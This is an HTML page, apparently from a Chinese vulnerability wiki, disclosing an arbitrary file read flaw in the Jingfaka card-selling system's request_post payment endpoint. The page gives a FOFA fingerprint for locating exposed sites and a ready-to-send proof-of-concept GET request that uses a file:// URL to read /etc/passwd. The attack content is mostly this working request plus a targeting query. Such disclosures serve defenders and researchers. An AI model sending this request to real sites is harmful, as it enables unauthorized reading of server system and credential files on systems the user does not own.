@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%8F%91%E5%8D%A1%E7%BD%91%E7%B3%BB%E7%BB%9F/%E9%B2%B8%E5%8F%91%E5%8D%A1%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E5%8F%91%E5%8D%A1%E7%BD%91request_post%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>鲸发卡系统自动发卡网request post存在任意文件读取漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9cb8\u53d1\u5361\u7cfb\u7edf\u81ea\u52a8\u53d1\u5361\u7f51request_post\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%8F%91%E8%B4%A7100/%E5%8F%91%E8%B4%A7100%20M_id%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-30193/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%8F%91%E8%B4%A7100/%E5%8F%91%E8%B4%A7100%20M_id%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-30193/" class="btn btn-xs btn-link">
+        发货100 M_id SQL注入漏洞 CNVD-2021-30193
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%9F%A5%E8%AF%86%E5%90%BE%E7%88%B1%E7%BA%AF%E5%87%80%E7%89%88%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9Fleibiao%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%9F%A5%E8%AF%86%E5%90%BE%E7%88%B1%E7%BA%AF%E5%87%80%E7%89%88%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9Fleibiao%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="request_post">鲸发卡系统自动发卡网request_post存在任意文件读取漏洞<a class="headerlink" href="#request_post" title="Permanent link">&para;</a></h2>
+<p><strong>鲸发卡系统是一款专业的虚拟商品寄售系统，支持多种功能和模式，为商户和买家提供便捷、绿色、安全、快速的销售和购买体验。本文档介绍了鲸发卡系统的特色功能、客户案例.</strong></p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="s">&quot;/static/theme/maowang51/css/style.css&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">GET /pay/xinhui/request_post?url=file:///etc/passwd&amp;post_data[1]=aaa HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Accept</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gzip, deflate</span>
+<span class="nt">Accept-Language</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">zh-CN,zh;q=0.9</span>
+<span class="nt">Cache-Control</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">max-age=0</span>
+<span class="nt">Connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keep-alive</span>
+<span class="nt">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="nt">Upgrade-Insecure-Requests</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
+<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span>
+</code></pre></div>
+<p><img alt="image-20240709133653012" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407091337787.png" /></p>
+<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/Cd50RjZcVMvv1sOBPR9gqg">https://mp.weixin.qq.com/s/Cd50RjZcVMvv1sOBPR9gqg</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%8F%91%E8%B4%A7100/%E5%8F%91%E8%B4%A7100%20M_id%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-30193/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%8F%91%E8%B4%A7100/%E5%8F%91%E8%B4%A7100%20M_id%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-30193/" class="btn btn-xs btn-link">
+        发货100 M_id SQL注入漏洞 CNVD-2021-30193
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%9F%A5%E8%AF%86%E5%90%BE%E7%88%B1%E7%BA%AF%E5%87%80%E7%89%88%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9Fleibiao%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%9F%A5%E8%AF%86%E5%90%BE%E7%88%B1%E7%BA%AF%E5%87%80%E7%89%88%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9Fleibiao%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
